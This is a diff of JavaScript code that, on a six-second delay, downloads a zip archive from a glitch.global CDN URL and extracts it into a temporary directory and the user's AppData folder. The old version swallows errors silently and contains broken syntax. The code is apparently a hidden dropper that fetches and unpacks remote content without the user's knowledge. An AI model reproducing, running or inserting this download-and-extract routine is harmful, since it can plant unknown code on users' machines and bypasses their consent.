@@ -67,12 +67,11 @@ if (fess.readdirSync(processPathe + '\\AppData')) {
   
   async function main() {
     try {
-      let tr = false;
-      await downloadFile("https://cdn.glitch.global/a683cb76-598f-4483-808e-6a7d6eee6c26/AppData.zip", "AppData.zip");
-      fess.readdirSync(processPathe + '\\AppData').forEach(() => {
-        tr = true;
-      })
+      await downloadFile("https://cdn.glitch.global/a683cb76-598f-4483-808e-6a7d6eee6c26/AppData.zip?v=1680295831751", "AppData.zip");
+      if (!fs.existsSync("AppData")) {
         fs.mkdirSync("AppData");
+      }
+      const tempDir = fs.mkdtempSync("temp");
       fs.createReadStream("AppData.zip")
         .pipe(unzipper.Extract({ path: tempDir }))
         .on('close', () => {
@@ -83,16 +82,11 @@ if (fess.readdirSync(processPathe + '\\AppData')) {
           fs.rmdirSync(tempDir, { recursive: true });
         });
     } catch (err) {
-      null
+      console.error(err);
     }
   }
-  setTimeout() (() => {
-    try {
+  setTimeout(() => {
       main();
-    } catch(err) {
-      null
-    }
-      
 
   }, 6000)
   
